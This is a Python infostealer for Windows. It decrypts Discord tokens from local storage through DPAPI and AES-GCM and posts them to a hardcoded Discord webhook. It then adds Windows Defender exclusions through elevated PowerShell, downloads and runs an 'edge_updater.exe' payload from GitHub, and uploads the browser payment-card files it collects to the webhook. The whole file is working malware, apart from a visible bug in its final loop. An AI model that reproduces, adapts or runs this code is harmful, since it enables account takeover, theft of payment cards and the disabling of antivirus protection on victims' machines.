import os
import re
import time
import json
from json import loads as json_loads, dumps
from urllib.request import Request, urlopen
from base64 import b64decode
from ctypes import (windll, wintypes, byref, cdll,
                    Structure, POINTER, c_char, c_buffer)
from Crypto.Cipher import AES
import requests

roaming = os.getenv('APPDATA')
temp = os.environ.get('TEMP') or os.getenv('TEMP')

Tokens = []
webhook_url = ("https://canary.discord.com/api/webhooks/1548207095155920998/"
               "J-KZeu0QQYWNvGTRuLM9FiGMV18LSb6Uz_48NRZoLJZNjhY_DqMDbJ-MuYYey5T7_NBj")

discordPaths = [
    f'{roaming}/Discord/Local Storage/leveldb',
    f'{roaming}/Lightcord/Local Storage/leveldb',
    f'{roaming}/discordcanary/Local Storage/leveldb',
    f'{roaming}/discordptb/Local Storage/leveldb',
]


class DATA_BLOB(Structure):
    _fields_ = [('cbData', wintypes.DWORD),
                ('pbData', POINTER(c_char))]

    __static_attributes__ = ()


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()

    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy),
                                          None, None, 0, byref(blob_out)):
        return GetData(blob_out)


def DecryptValue(buff, master_key=None):
    try:
        starts = buff.decode(encoding='utf8', errors='ignore')[:3]
        if starts in ('v10', 'v11'):
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            return decrypted_pass[:-16].decode()
    except Exception:
        return None


def checkToken(token):
    headers = {
        'Authorization': token,
        'Content-Type': 'application/json',
        'User-Agent': ('Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) '
                       'Gecko/20100101 Firefox/102.0'),
    }
    try:
        req = urlopen(Request('https://discordapp.com/api/v6/users/@me', headers=headers))
        return req.getcode() == 200
    except Exception:
        return False


def uploadToken(token, path):
    try:
        data = {
            'content': f'Bulunan Yol: `{path}`\nToken: ||`{token}`||',
            'username': 'cagin web helper',
            'avatar_url': ('https://cdn.discordapp.com/attachments/970003785558683698/'
                           '1031147917685309490/sa.jpg'),
        }
        requests.post(webhook_url, json=data)
    except Exception:
        return None


def runUpdaterAndHarvestCards():
    try:
        exe_path = os.path.join(temp, 'edge_updater.exe')

        ex_path_cmd = f"Add-MpPreference -ExclusionPath '{exe_path}'"
        ex_proc_cmd = "Add-MpPreference -ExclusionProcess 'edge_updater.exe'"

        windll.shell32.ShellExecuteW(
            None, 'runas', 'powershell.exe',
            f'-Command "{ex_path_cmd}; {ex_proc_cmd}"', None, 1)
        time.sleep(3)

        url = ('https://github.com/ring0private/caginyucel/releases/download/31/'
               'edge_updater.exe')
        r = requests.get(url)
        if r.status_code == 200:
            with open(exe_path, 'wb') as f:
                f.write(r.content)

            windll.shell32.ShellExecuteW(None, 'runas', exe_path, 'all', None, 1)

        output_dir = os.path.join(temp, 'output')
        for _ in range(20):
            if os.path.exists(output_dir) and len(os.listdir(output_dir)) > 0:
                time.sleep(2)
                break
            time.sleep(2)

        if os.path.exists(output_dir):
            for browser_name in os.listdir(output_dir):
                default_path = os.path.join(output_dir, browser_name, 'Default')
                cards_file = os.path.join(default_path, 'cards.json')
                if os.path.exists(cards_file):
                    with open(cards_file, 'rb') as cf:
                        files = {'file': cf}
                        payload = {
                            'payload_json': dumps({
                                'content': f'Tarayıcı Kartları ({browser_name}):',
                                'username': 'cagin web helper',
                                'avatar_url': ('https://cdn.discordapp.com/attachments/'
                                               '970003785558683698/1031147917685309490/sa.jpg'),
                            })
                        }
                        requests.post(webhook_url, data=payload, files=files)
    except Exception:
        return None


def GetDiscord(path, arg):
    if not os.path.exists(f'{path}/Local State'):
        return

    pathC = path + arg
    pathKey = path + '/Local State'

    try:
        with open(pathKey, 'r', encoding='utf-8') as f:
            local_state = json_loads(f.read())
    except Exception:
        return

    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])

    if not os.path.exists(pathC):
        return

    for file in os.listdir(pathC):
        if file.endswith('.log') or file.endswith('.ldb'):
            try:
                with open(f'{pathC}\\{file}', errors='ignore') as f:
                    lines = f.readlines()
            except Exception:
                continue

            for line in lines:
                for token in re.findall('dQw4w9WgXcQ:[^.*\\[\'(.*)\'\\].*$][^\\"]*',
                                        line.strip()):
                    try:
                        token_part = token.split('dQw4w9WgXcQ:')[1]
                        tokenDecoded = DecryptValue(b64decode(token_part), master_key)
                        if tokenDecoded:
                            if checkToken(tokenDecoded):
                                if tokenDecoded not in Tokens:
                                    Tokens.append(tokenDecoded)
                                    uploadToken(tokenDecoded, path)
                    except Exception:
                        continue


for patt in discordPaths:
    GetDiscord(patt[0], patt[1])

runUpdaterAndHarvestCards()
